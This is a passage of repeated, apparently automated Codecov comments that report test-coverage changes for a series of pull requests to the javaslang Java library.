\n======================================\n- Hit           8804    8803     -1\n- Partial         92      93     +1\n  Missed         265     265\n\nReview entire Coverage Diff as of fc0f6b1\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.12%\nMerging #1217 into master will increase coverage by +0.02% as of 6dc6eda\n\ndiff\n@@            master   #1217   diff @@\n======================================\n  Files           78      78       \n  Stmts         9161    9160     -1\n  Branches      1717    1717       \n  Methods          0       0       \n======================================\n+ Hit           8804    8805     +1\n+ Partial         92      91     -1\n+ Missed         265     264     -1\n\nReview entire Coverage Diff as of 6dc6eda\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.09%\nMerging #1219 into master will decrease coverage by -0.01% as of 85714b0\n\ndiff\n@@            master   #1219   diff @@\n======================================\n  Files           78      78       \n  Stmts         9161    9161       \n  Branches      1717    1717       \n  Methods          0       0       \n======================================\n- Hit           8804    8803     -1\n- Partial         92      93     +1\n  Missed         265     265\n\nReview entire Coverage Diff as of 85714b0\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.10%\nMerging #1222 into master will decrease coverage by -0.01% as of 6109d54\n\ndiff\n@@            master   #1222   diff @@\n======================================\n  Files           78      78       \n  Stmts         9161    9161       \n  Branches      1717    1717       \n  Methods          0       0       \n======================================\n- Hit           8805    8804     -1\n  Partial         92      92       \n- Missed         264     265     +1\n\nReview entire Coverage Diff as of 6109d54\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.10%\nMerging #1223 into master will not affect coverage as of d3c6cea\n\ndiff\n@@            master   #1223   diff @@\n======================================\n  Files           78      78       \n  Stmts         9161    9161       \n  Branches      1717    1717       \n  Methods          0       0       \n======================================\n  Hit           8804    8804       \n  Partial         92      92       \n  Missed         265     265\n\nReview entire Coverage Diff as of d3c6cea\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.10%\nMerging #1224 into master will not affect coverage as of 6638eb0\n\ndiff\n@@            master   #1224   diff @@\n======================================\n  Files           78      78       \n  Stmts         9161    9161       \n  Branches      1717    1717       \n  Methods          0       0       \n======================================\n  Hit           8804    8804       \n  Partial         92      92       \n  Missed         265     265\n\nReview entire Coverage Diff as of 6638eb0\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.10%\nMerging #1228 into master will not affect coverage as of 8a121df\n\ndiff\n@@            master   #1228   diff @@\n======================================\n  Files           78      78       \n  Stmts         9161    9161       \n  Branches      1717    1717       \n  Methods          0       0       \n======================================\n  Hit           8804    8804       \n  Partial         92      92       \n  Missed         265     265\n\nReview entire Coverage Diff as of 8a121df\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.10%\nMerging #1231 into master will not affect coverage as of b93a4df\n\ndiff\n@@            master   #1231   diff @@\n======================================\n  Files           78      78       \n  Stmts         9161    9168     +7\n  Branches      1717    1717       \n  Methods          0       0       \n======================================\n+ Hit           8804    8811     +7\n  Partial         92      92       \n  Missed         265     265\n\nReview entire Coverage Diff as of b93a4df\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.10%\nMerging #1233 into master will not affect coverage as of b005640\n\ndiff\n@@            master   #1233   diff @@\n======================================\n  Files           78      78       \n  Stmts         9168    9168       \n  Branches      1717    1717       \n  Methods          0       0       \n======================================\n  Hit           8811    8811       \n  Partial         92      92       \n  Missed         265     265\n\nReview entire Coverage Diff as of b005640\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.10%\nMerging #1234 into master will increase coverage by +0.01% as of 91b41d7\n\ndiff\n@@            master   #1234   diff @@\n======================================\n  Files           78      78       \n  Stmts         9168    9170     +2\n  Branches      1717    1717       \n  Methods          0       0       \n======================================\n+ Hit           8810    8813     +3\n+ Partial         93      92     -1\n  Missed         265     265\n\nReview entire Coverage Diff as of 91b41d7\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.12%\nMerging #1236 into master will increase coverage by +0.03% as of 79b259f\n\ndiff\n@@            master   #1236   diff @@\n======================================\n  Files           78      78       \n  Stmts         9168    9168       \n  Branches      1717    1717       \n  Methods          0       0       \n======================================\n+ Hit           8810    8813     +3\n+ Partial         93      91     -2\n+ Missed         265     264     -1\n\nReview entire Coverage Diff as of 79b259f\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.12%\nMerging #1237 into master will increase coverage by +0.02% as of 3ecc238\n\ndiff\n@@            master   #1237   diff @@\n======================================\n  Files           78      78       \n  Stmts         9170    9170       \n  Branches      1717    1717       \n  Methods          0       0       \n======================================\n+ Hit           8813    8815     +2\n+ Partial         92      91     -1\n+ Missed         265     264     -1\n\nReview entire Coverage Diff as of 3ecc238\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.03%\nMerging #1240 into master will decrease coverage by -0.07% as of 7f1a083\n\ndiff\n@@            master   #1240   diff @@\n======================================\n  Files           78      83     +5\n  Stmts         9170    9531   +361\n  Branches      1717    1766    +49\n  Methods          0       0       \n======================================\n+ Hit           8813    9153   +340\n- Partial         92      98     +6\n- Missed         265     280    +15\n\nReview entire Coverage Diff as of 7f1a083\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.97%\nMerging #1242 into master will decrease coverage by -0.07% as of b7a3e29\n\ndiff\n@@            master   #1242   diff @@\n======================================\n  Files           83      83       \n  Stmts         9531    9507    -24\n  Branches      1766    1759     -7\n  Methods          0       0       \n======================================\n- Hit           9154    9124    -30\n- Partial         98     100     +2\n- Missed         279     283     +4\n\nReview entire Coverage Diff as of b7a3e29\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.61%\nMerging #1245 into master will decrease coverage by -0.44% as of 372f4e4\n\ndiff\n@@            master   #1245   diff @@\n======================================\n  Files           83      83       \n  Stmts         9531    9591    +60\n  Branches      1766    1765     -1\n  Methods          0       0       \n======================================\n+ Hit           9155    9170    +15\n- Partial         97      99     +2\n- Missed         279     322    +43\n\nReview entire Coverage Diff as of 372f4e4\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 96.02%\nMerging #1247 into master will decrease coverage by -0.03% as of f449e42\n\ndiff\n@@            master   #1247   diff @@\n======================================\n  Files           83      83       \n  Stmts         9531    9531       \n  Branches      1766    1766       \n  Methods          0       0       \n======================================\n- Hit           9155    9152     -3\n- Partial         97      99     +2\n- Missed         279     280     +1\n\nReview entire Coverage Diff as of f449e42\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.98%\nMerging #1250 into master will not affect coverage as of 8ceb23c\n\ndiff\n@@            master   #1250   diff @@\n======================================\n  Files           83      83       \n  Stmts         9507    9507       \n  Branches      1759    1759       \n  Methods          0       0       \n======================================\n  Hit           9125    9125       \n  Partial         99      99       \n  Missed         283     283\n\nReview entire Coverage Diff as of 8ceb23c\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.63%\nMerging #1253 into master will decrease coverage by -0.25% as of ba893b7\n\ndiff\n@@            master   #1253   diff @@\n======================================\n  Files           83      83       \n  Stmts         9528    9561    +33\n  Branches      1759    1759       \n  Methods          0       0       \n======================================\n+ Hit           9136    9144     +8\n- Partial         99     100     +1\n- Missed         293     317    +24\n\nReview entire Coverage Diff as of ba893b7\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.64%\nMerging #1256 into master will not affect coverage as of 2db8988\n\ndiff\n@@            master   #1256   diff @@\n======================================\n  Files           83      83       \n  Stmts         9561    9560     -1\n  Branches      1759    1759       \n  Methods          0       0       \n======================================\n- Hit           9145    9144     -1\n  Partial         99      99       \n  Missed         317     317\n\nReview entire Coverage Diff as of 2db8988\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.46%\nMerging #1258 into master will decrease coverage by -0.18% as of 17d3429\n\ndiff\n@@            master   #1258   diff @@\n======================================\n  Files           83      83       \n  Stmts         9560    9579    +19\n  Branches      1759    1760     +1\n  Methods          0       0       \n======================================\n+ Hit           9144    9145     +1\n- Partial         99     101     +2\n- Missed         317     333    +16\n\nReview entire Coverage Diff as of 17d3429\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.64%\nMerging #1259 into master will not affect coverage as of 3dfe445\n\ndiff\n@@            master   #1259   diff @@\n======================================\n  Files           83      83       \n  Stmts         9560    9560       \n  Branches      1759    1759       \n  Methods          0       0       \n======================================\n  Hit           9144    9144       \n  Partial         99      99       \n  Missed         317     317\n\nReview entire Coverage Diff as of 3dfe445\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.68%\nMerging #1260 into master will increase coverage by +0.04% as of 7471c81\n\ndiff\n@@            master   #1260   diff @@\n======================================\n  Files           83      83       \n  Stmts         9560    9624    +64\n  Branches      1759    1766     +7\n  Methods          0       0       \n======================================\n+ Hit           9144    9209    +65\n  Partial         99      99       \n+ Missed         317     316     -1\n\nReview entire Coverage Diff as of 7471c81\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.71%\nMerging #1262 into master will increase coverage by +0.07% as of 9d42086\n\ndiff\n@@            master   #1262   diff @@\n======================================\n  Files           83      83       \n  Stmts         9560    9574    +14\n  Branches      1759    1759       \n  Methods          0       0       \n======================================\n+ Hit           9144    9164    +20\n- Partial         99     100     +1\n+ Missed         317     310     -7\n\nReview entire Coverage Diff as of 9d42086\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.68%\nMerging #1266 into master will not affect coverage as of 15ae10c\n\ndiff\n@@            master   #1266   diff @@\n======================================\n  Files           83      83       \n  Stmts         9624    9622     -2\n  Branches      1766    1766       \n  Methods          0       0       \n======================================\n- Hit           9209    9207     -2\n  Partial         99      99       \n  Missed         316     316\n\nReview entire Coverage Diff as of 15ae10c\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.68%\nMerging #1267 into master will not affect coverage as of 721039f\n\ndiff\n@@            master   #1267   diff @@\n======================================\n  Files           83      83       \n  Stmts         9624    9624       \n  Branches      1766    1766       \n  Methods          0       0       \n======================================\n  Hit           9209    9209       \n  Partial         99      99       \n  Missed         316     316\n\nReview entire Coverage Diff as of 721039f\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.62%\nMerging #1269 into master will decrease coverage by -0.08% as of 7ada921\n\ndiff\n@@            master   #1269   diff @@\n======================================\n  Files           83      83       \n  Stmts         9622    9592    -30\n  Branches      1766    1760     -6\n  Methods          0       0       \n======================================\n- Hit           9209    9172    -37\n- Partial         98     100     +2\n- Missed         315     320     +5\n\nReview entire Coverage Diff as of 7ada921\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.50%\nMerging #1281 into master will decrease coverage by -0.12% as of 7d13533\n\ndiff\n@@            master   #1281   diff @@\n======================================\n  Files           83      83       \n  Stmts         9592    9472   -120\n  Branches      1760    1705    -55\n  Methods          0       0       \n======================================\n- Hit           9172    9046   -126\n- Partial        100     107     +7\n+ Missed         320     319     -1\n\nReview entire Coverage Diff as of 7d13533\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.62%\nMerging #1282 into master will not affect coverage as of 6b8efb7\n\ndiff\n@@            master   #1282   diff @@\n======================================\n  Files           83      83       \n  Stmts         9592    9592       \n  Branches      1760    1761     +1\n  Methods          0       0       \n======================================\n  Hit           9172    9172       \n- Partial        100     101     +1\n+ Missed         320     319     -1\n\nReview entire Coverage Diff as of 6b8efb7\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.67%\nMerging #1283 into master will increase coverage by +0.02% as of 85b2f95\n\ndiff\n@@            master   #1283   diff @@\n======================================\n  Files           83      83       \n  Stmts         9592    9579    -13\n  Branches      1761    1757     -4\n  Methods          0       0       \n======================================\n- Hit           9175    9165    -10\n- Partial         99     100     +1\n+ Missed         318     314     -4\n\nReview entire Coverage Diff as of 85b2f95\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.62%\nMerging #1284 into master will decrease coverage by -0.03% as of 7bc105b\n\ndiff\n@@            master   #1284   diff @@\n======================================\n  Files           83      83       \n  Stmts         9592    9592       \n  Branches      1761    1761       \n  Methods          0       0       \n======================================\n- Hit           9175    9172     -3\n- Partial         99     101     +2\n- Missed         318     319     +1\n\nReview entire Coverage Diff as of 7bc105b\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.49%\nMerging #1285 into master will decrease coverage by -0.17% as of 44c1f74\n\ndiff\n@@            master   #1285   diff @@\n======================================\n  Files           83      83       \n  Stmts         9579    9466   -113\n  Branches      1757    1705    -52\n  Methods          0       0       \n======================================\n- Hit           9164    9040   -124\n- Partial        101     107     +6\n- Missed         314     319     +5\n\nReview entire Coverage Diff as of 44c1f74\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.31%\nMerging #1286 into master will decrease coverage by -0.17% as of 4d821b6\n\ndiff\n@@            master   #1286   diff @@\n======================================\n  Files           83      83       \n  Stmts         9466    9444    -22\n  Branches      1705    1703     -2\n  Methods          0       0       \n======================================\n- Hit           9039    9002    -37\n+ Partial        108     107     -1\n- Missed         319     335    +16\n\nReview entire Coverage Diff as of 4d821b6\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.34%\nMerging #1287 into master will increase coverage by +0.02% as of d9b81fd\n\ndiff\n@@            master   #1287   diff @@\n======================================\n  Files           83      83       \n  Stmts         9450    9470    +20\n  Branches      1703    1705     +2\n  Methods          0       0       \n======================================\n+ Hit           9008    9029    +21\n  Partial        107     107       \n+ Missed         335     334     -1\n\nReview entire Coverage Diff as of d9b81fd\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.32%\nMerging #1289 into master will decrease coverage by -0.01% as of 6e28ef0\n\ndiff\n@@            master   #1289   diff @@\n======================================\n  Files           83      83       \n  Stmts         9470    9462     -8\n  Branches      1705    1705       \n  Methods          0       0       \n======================================\n- Hit           9028    9020     -8\n  Partial        107     107       \n  Missed         335     335\n\nReview entire Coverage Diff as of 6e28ef0\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.46%\nMerging #1291 into master will increase coverage by +0.13% as of 812263d\n\ndiff\n@@            master   #1291   diff @@\n======================================\n  Files           83      83       \n  Stmts         9470    9470       \n  Branches      1705    1705       \n  Methods          0       0       \n======================================\n+ Hit           9028    9041    +13\n- Partial        107     108     +1\n+ Missed         335     321    -14\n\nReview entire Coverage Diff as of 812263d\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.47%\nMerging #1294 into master will increase coverage by +0.01% as of 632bb6b\n\ndiff\n@@            master   #1294   diff @@\n======================================\n  Files           83      83       \n  Stmts         9462    9453     -9\n  Branches      1705    1705       \n  Methods          0       0       \n======================================\n- Hit           9033    9025     -8\n- Partial        108     109     +1\n+ Missed         321     319     -2\n\nReview entire Coverage Diff as of 632bb6b\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.50%\nMerging #1296 into master will increase coverage by +0.03% as of c569197\n\ndiff\n@@            master   #1296   diff @@\n======================================\n  Files           83      83       \n  Stmts         9453    9455     +2\n  Branches      1705    1705       \n  Methods          0       0       \n======================================\n+ Hit           9025    9030     +5\n+ Partial        109     107     -2\n+ Missed         319     318     -1\n\nReview entire Coverage Diff as of c569197\nPowered by Codecov. Updated on successful CI builds.\n. ## Current coverage is 95.47%\nMerging #1299 into master will decrease coverage by -0.00%\n\ndiff\n@@             master      #1299   diff @@\n==========================================\n  Files            83         83          \n  Lines          9455       9461     +6   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1705       1711     +6   \n==========================================\n+ Hits           9027       9032     +5   \n  Misses          319        319          \n- Partials        109        110     +1\n1. File ...ncurrent/Future.java (not in diff) was modified. more \n   - Misses 0 \n   - Partials +1 \n   - Hits -1\n\n\nPowered by Codecov. Last updated by 5187ae9\n. ## Current coverage is 95.57%\nMerging #1300 into master will increase coverage by +<.01%\n1. 2 files (not in diff) in .../main/java/javaslang were modified. more \n   - Misses -1 \n   - Partials -2 \n   - Hits +3\n\ndiff\n@@             master      #1300   diff @@\n==========================================\n  Files            83         85     +2   \n  Lines          9465       9668   +203   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1712       1744    +32   \n==========================================\n+ Hits           9044       9240   +196   \n- Misses          311        313     +2   \n- Partials        110        115     +5\n\nPowered by Codecov. Last updated by 24ca0a8...815b06a\n. ## Current coverage is 95.47%\nMerging #1308 into master will decrease coverage by -<.01%\n1. 2 files (not in diff) in ...javaslang/concurrent were modified. more \n   - Misses +2 \n   - Hits -2\n2. 7 files (not in diff) in ...javaslang/collection were modified. more \n   - Misses +6 \n   - Partials -1 \n   - Hits -7\n3. 3 files (not in diff) in .../main/java/javaslang were modified. more \n   - Hits -1\n\ndiff\n@@             master      #1308   diff @@\n==========================================\n  Files            83         83          \n  Lines          9465       9442    -23   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1712       1709     -3   \n==========================================\n- Hits           9044       9014    -30   \n- Misses          311        319     +8   \n+ Partials        110        109     -1\n\nPowered by Codecov. Last updated by 24ca0a8...185db48\n. ## Current coverage is 95.37%\nMerging #1317 into master will decrease coverage by 0.19%\n1. 2 files in ...javaslang/collection were modified. more \n   - Misses -3 \n   - Hits +3\n2. File ...rent/FutureImpl.java (not in diff) was modified. more \n   - Misses 0 \n   - Partials +1 \n   - Hits -1\n3. File ...llection/BitSet.java (not in diff) was created. more\n\ndiff\n@@             master      #1317   diff @@\n==========================================\n  Files            85         86     +1   \n  Lines          9662      10347   +685   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1752       1873   +121   \n==========================================\n+ Hits           9235       9868   +633   \n- Misses          310        350    +40   \n- Partials        117        129    +12\n\nPowered by Codecov. Last updated by d674941...10c5961\n. ## Current coverage is 95.53%\nMerging #1321 into master will decrease coverage by -<.01%\n\ndiff\n@@             master      #1321   diff @@\n==========================================\n  Files            85         85          \n  Lines          9670       9669     -1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1749       1749          \n==========================================\n- Hits           9238       9237     -1   \n  Misses          313        313          \n  Partials        119        119\n\nPowered by Codecov. Last updated by e9ce470...fa7da53\n. ## Current coverage is 95.53%\nMerging #1321 into master will increase coverage by +<.01%\n\ndiff\n@@             master      #1321   diff @@\n==========================================\n  Files            85         85          \n  Lines          9670       9630    -40   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1749       1752     +3   \n==========================================\n- Hits           9238       9200    -38   \n+ Misses          313        312     -1   \n+ Partials        119        118     -1\n\nPowered by Codecov. Last updated by e9ce470...d2c66ab\n. ## Current coverage is 95.57%\nMerging #1324 into master will increase coverage by +<.01%\n1. File ...rent/FutureImpl.java (not in diff) was modified. more \n   - Misses -1 \n   - Partials -1 \n   - Hits +2\n\ndiff\n@@             master      #1324   diff @@\n==========================================\n  Files            85         85          \n  Lines          9670       9670          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1749       1749          \n==========================================\n+ Hits           9240       9242     +2   \n+ Misses          312        311     -1   \n+ Partials        118        117     -1\n\nPowered by Codecov. Last updated by bc58ad9...a01377a\n. ## Current coverage is 95.57%\nMerging #1330 into master will increase coverage by +<.01%\n1. 2 files (not in diff) in .../main/java/javaslang were modified. more \n   - Misses -2 \n   - Partials +1 \n   - Hits +1\n\ndiff\n@@             master      #1330   diff @@\n==========================================\n  Files            85         85          \n  Lines          9660       9660          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1752       1752          \n==========================================\n+ Hits           9231       9232     +1   \n+ Misses          312        310     -2   \n- Partials        117        118     +1\n\nPowered by Codecov. Last updated by 9cae74d...a9cd520\n. ## Current coverage is 95.55%\nMerging #1334 into master will decrease coverage by <.01%\n1. 2 files (not in diff) in ...javaslang/collection were modified. more \n   - Misses -1 \n   - Hits +3\n\ndiff\n@@             master      #1334   diff @@\n==========================================\n  Files            85         86     +1   \n  Lines          9660       9988   +328   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1752       1802    +50   \n==========================================\n+ Hits           9233       9544   +311   \n- Misses          310        318     +8   \n- Partials        117        126     +9\n\nPowered by Codecov. Last updated by 4a1994a...af641d3\n. ## Current coverage is 95.58%\nMerging #1335 into master will not change coverage\n\ndiff\n@@             master      #1335   diff @@\n==========================================\n  Files            85         85          \n  Lines          9660       9660          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1752       1752          \n==========================================\n  Hits           9233       9233          \n  Misses          310        310          \n  Partials        117        117\n\nPowered by Codecov. Last updated by 4a1994a...11db327\n. ## Current coverage is 95.54%\nMerging #1349 into master will not change coverage\n1. 2 files (not in diff) in .../main/java/javaslang were modified. more \n   - Misses +1 \n   - Partials -1\n\ndiff\n@@             master      #1349   diff @@\n==========================================\n  Files            86         86          \n  Lines          9988       9988          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1802       1802          \n==========================================\n  Hits           9543       9543          \n- Misses          318        319     +1   \n+ Partials        127        126     -1\n\nPowered by Codecov. Last updated by 930163f...b1cd544\n. ## Current coverage is 95.57%\nMerging #1350 into master will increase coverage by <.01%\n1. 2 files (not in diff) in .../main/java/javaslang were modified. more \n   - Partials -2 \n   - Hits +2\n\ndiff\n@@             master      #1350   diff @@\n==========================================\n  Files            86         86          \n  Lines          9988       9991     +3   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1802       1803     +1   \n==========================================\n+ Hits           9543       9548     +5   \n  Misses          318        318          \n+ Partials        127        125     -2\n\nPowered by Codecov. Last updated by 930163f...0f1bf89\n. ## Current coverage is 95.55%\nMerging #1352 into master will decrease coverage by <.01%\n1. File ...llection/BitSet.java (not in diff) was modified. more \n   - Misses +1 \n   - Partials 0 \n   - Hits -1\n\ndiff\n@@             master      #1352   diff @@\n==========================================\n  Files            86         86          \n  Lines         10033      10035     +2   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1813       1813          \n==========================================\n+ Hits           9587       9588     +1   \n- Misses          318        319     +1   \n  Partials        128        128\n\nPowered by Codecov. Last updated by 0c53187...70f47cb\n. ## Current coverage is 95.53%\nMerging #1357 into master will decrease coverage by <.01%\n1. File ...ArrayMappedTrie.java was modified. more \n   - Misses 0 \n   - Partials +1 \n   - Hits -1\n\ndiff\n@@             master      #1357   diff @@\n==========================================\n  Files            86         86          \n  Lines          9992      10033    +41   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1803       1813    +10   \n==========================================\n+ Hits           9546       9585    +39   \n  Misses          319        319          \n- Partials        127        129     +2\n\nPowered by Codecov. Last updated by d702207...e1235db\n. ## Current coverage is 95.51%\nMerging #1360 into master will decrease coverage by <.01%\n1. File ...llection/BitSet.java was modified. more \n   - Misses +1 \n   - Partials 0 \n   - Hits -1\n\ndiff\n@@             master      #1360   diff @@\n==========================================\n  Files            86         86          \n  Lines         10035      10062    +27   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1813       1814     +1   \n==========================================\n+ Hits           9588       9610    +22   \n- Misses          318        323     +5   \n  Partials        129        129\n\nPowered by Codecov. Last updated by 73b049a...ca910e7\n. ## Current coverage is 95.53%\nMerging #1361 into master will increase coverage by <.01%\n1. File ...llection/BitSet.java (not in diff) was modified. more \n   - Misses +1 \n   - Partials 0 \n   - Hits -1\n\ndiff\n@@             master      #1361   diff @@\n==========================================\n  Files            86         86          \n  Lines         10062      10088    +26   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1814       1820     +6   \n==========================================\n+ Hits           9612       9637    +25   \n- Misses          322        323     +1   \n  Partials        128        128\n\nPowered by Codecov. Last updated by 27c57b8...d6ad58a\n. ## Current coverage is 95.37%\nMerging #1362 into master will decrease coverage by 0.13%\n1. File ...rent/FutureImpl.java (not in diff) was modified. more \n   - Misses 0 \n   - Partials +1 \n   - Hits -1\n\ndiff\n@@             master      #1362   diff @@\n==========================================\n  Files            86         86          \n  Lines         10062      10086    +24   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1814       1823     +9   \n==========================================\n+ Hits           9612       9619     +7   \n- Misses          322        337    +15   \n- Partials        128        130     +2\n\nPowered by Codecov. Last updated by 27c57b8...bcf5a85\n. ## Current coverage is 95.62%\nMerging #1364 into master will decrease coverage by <.01%\n1. File ...rent/FutureImpl.java (not in diff) was modified. more \n   - Misses 0 \n   - Partials +1 \n   - Hits -1\n\ndiff\n@@             master      #1364   diff @@\n==========================================\n  Files            86         86          \n  Lines         10088      10020    -68   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1819       1796    -23   \n==========================================\n- Hits           9654       9581    -73   \n- Misses          312        314     +2   \n- Partials        122        125     +3\n\nPowered by Codecov. Last updated by 874a11d...7e7b6e0\n. ## Current coverage is 95.69%\nMerging #1365 into master will increase coverage by 0.29%\n1. File ...llection/BitSet.java was modified. more \n   - Misses -20 \n   - Partials -2 \n   - Hits +22\n\ndiff\n@@             master      #1365   diff @@\n==========================================\n  Files            86         86          \n  Lines         10086      10080     -6   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1819     -4   \n==========================================\n+ Hits           9620       9646    +26   \n+ Misses          337        312    -25   \n+ Partials        129        122     -7\n\nPowered by Codecov. Last updated by 1f3ad8d...6ecddc1\n. ## Current coverage is 95.37%\nMerging #1368 into master will decrease coverage by <.01%\n1. File ...rent/FutureImpl.java (not in diff) was modified. more \n   - Misses 0 \n   - Partials +1 \n   - Hits -1\n\ndiff\n@@             master      #1368   diff @@\n==========================================\n  Files            86         86          \n  Lines         10086      10094     +8   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n+ Hits           9620       9627     +7   \n  Misses          337        337          \n- Partials        129        130     +1\n\nPowered by Codecov. Last updated by 1f3ad8d...69fb192\n. ## Current coverage is 95.37%\nMerging #1369 into master will decrease coverage by <.01%\n1. File ...rent/FutureImpl.java (not in diff) was modified. more \n   - Misses 0 \n   - Partials +1 \n   - Hits -1\n\ndiff\n@@             master      #1369   diff @@\n==========================================\n  Files            86         86          \n  Lines         10086      10086          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1823          \n==========================================\n- Hits           9620       9619     -1   \n  Misses          337        337          \n- Partials        129        130     +1\n\nPowered by Codecov. Last updated by 1f3ad8d...73f0a13\n. ## Current coverage is 97.21%\nMerging #1370 into master will increase coverage by 1.83%\n1. 5 files in ...javaslang/collection were modified. more \n   - Misses -1 \n   - Hits +3\n2. 6 files (not in diff) in ...javaslang/collection were modified. more \n   - Misses -25 \n   - Partials -7 \n   - Hits +29\n3. 3 files (not in diff) in .../main/java/javaslang were modified. more \n   - Misses -8 \n   - Partials +2 \n   - Hits +11\n4. 1 files (not in diff) in javaslang/src were modified. more \n   - Misses -146 \n   - Partials +5 \n   - Hits +141\n\ndiff\n@@             master      #1370   diff @@\n==========================================\n  Files            86         86          \n  Lines         10086      10285   +199   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1823       1821     -2   \n==========================================\n+ Hits           9620       9999   +379   \n+ Misses          337        157   -180   \n  Partials        129        129\n\nPowered by Codecov. Last updated by 1f3ad8d...c9db642\n. ## Current coverage is 97.17%\nMerging #1371 into master will increase coverage by 1.48%\n1. 2 files (not in diff) in javaslang were modified. more \n   - Misses -154 \n   - Partials +5 \n   - Hits +149\n\ndiff\n@@             master      #1371   diff @@\n==========================================\n  Files            86         86          \n  Lines         10088      10088          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1819       1819          \n==========================================\n+ Hits           9654       9803   +149   \n+ Misses          312        158   -154   \n- Partials        122        127     +5\n\nPowered by Codecov. Last updated by 874a11d...47b3a9c\n. ## Current coverage is 95.68%\nMerging #1372 into master will decrease coverage by 0.01%\n1. File ...rent/FutureImpl.java (not in diff) was modified. more \n   - Misses 0 \n   - Partials +1 \n   - Hits -1\n\ndiff\n@@             master      #1372   diff @@\n==========================================\n  Files            86         86          \n  Lines         10088      10083     -5   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1819       1815     -4   \n==========================================\n- Hits           9654       9648     -6   \n  Misses          312        312          \n- Partials        122        123     +1\n\nPowered by Codecov. Last updated by 874a11d...3dd6670\n. ## Current coverage is 97.17%\nMerging #1373 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1373   diff @@\n==========================================\n  Files            86         86          \n  Lines         10088      10094     +6   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1819       1817     -2   \n==========================================\n+ Hits           9803       9809     +6   \n  Misses          158        158          \n  Partials        127        127\n\nPowered by Codecov. Last updated by ec7440d...0f769e8\n. ## Current coverage is 97.16%\nMerging #1375 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1375   diff @@\n==========================================\n  Files            86         86          \n  Lines         10094      10099     +5   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1817       1818     +1   \n==========================================\n+ Hits           9809       9813     +4   \n  Misses          158        158          \n- Partials        127        128     +1\n\nPowered by Codecov. Last updated by b24ea12...d3e6616\n. ## Current coverage is 97.16%\nMerging #1376 into master will decrease coverage by <.01%\n1. File ...ang/control/Try.java (not in diff) was modified. more\n\ndiff\n@@             master      #1376   diff @@\n==========================================\n  Files            86         86          \n  Lines         10099      10110    +11   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1818       1820     +2   \n==========================================\n+ Hits           9813       9823    +10   \n  Misses          158        158          \n- Partials        128        129     +1\n\nPowered by Codecov. Last updated by c47d5c5...bb83c27\n. ## Current coverage is 97.17%\nMerging #1383 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1383   diff @@\n==========================================\n  Files            86         86          \n  Lines         10099      10130    +31   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1818       1821     +3   \n==========================================\n+ Hits           9813       9844    +31   \n+ Misses          158        157     -1   \n- Partials        128        129     +1\n\nPowered by Codecov. Last updated by c47d5c5...8ef276f\n. ## Current coverage is 